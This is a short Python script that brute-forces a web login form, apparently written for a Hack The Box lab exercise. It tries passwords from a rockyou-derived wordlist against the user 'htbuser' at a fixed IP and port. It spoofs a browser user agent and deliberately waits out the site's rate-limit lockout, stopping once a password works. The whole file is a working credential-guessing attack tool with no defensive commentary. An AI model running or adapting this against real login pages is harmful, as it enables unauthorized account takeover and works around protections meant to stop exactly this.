import time
import requests

# file that contains passwords
# grep '[[:upper:]]' rockyou-50.txt | grep '[[:digit:]]' > testing.txt
PASSFILE = "testing.txt"

# create url using user and password as argument
URL = "http://83.136.253.251:43964/"

# rate limit blocks for 40 seconds
LOCK_TIME = 40

# message that alert us we hit rate limit
LOCK_MESSAGE = "Too many login"

# read user and password
with open(PASSFILE, "r", encoding="utf-8") as passfile:
    for line in passfile:
        # skip comment
        if line.startswith("# "):
            continue

        # take password, join to keep password that contain a :
        password = line.strip("\n")

        # prepare POST data
        data = {
            'userid': 'htbuser',
            'passwd': password,
            'submit': 'submit'
        }

        headers = {
            'Content-Type' : 'application/x-www-form-urlencoded',
            'Referer' : 'http://83.136.253.251:43964/',
            # fake user agent presenting as a chromium browser. change as needed
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        }

        # do the request
        res = requests.post(URL, data=data, headers=headers)
        # Print request information
        print("Sending request:")
        print("URL:", URL)
        print("Headers:", headers)
        print("Data:", data)
        print(res.text)

        # print(res._content)
        # handle generic credential error
        if "Invalid credentials" in res.text:
            print(f"[-] Invalid credentials: userid:htbuser passwd:{password}")
        # hit rate limit, let's say we have to wait 30 seconds
        elif LOCK_MESSAGE in res.text:
            # with open("skip2.txt", "a") as file:
            #     file.write(password)
            print(f"[-] Hit rate limit in {password}[!] sleeping {LOCK_TIME}\n")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(LOCK_TIME+0.5)
        # user and password were valid !
        else:
            print(f"[+] Valid credentials: userid:htbuser passwd:{password} [+]")
            break
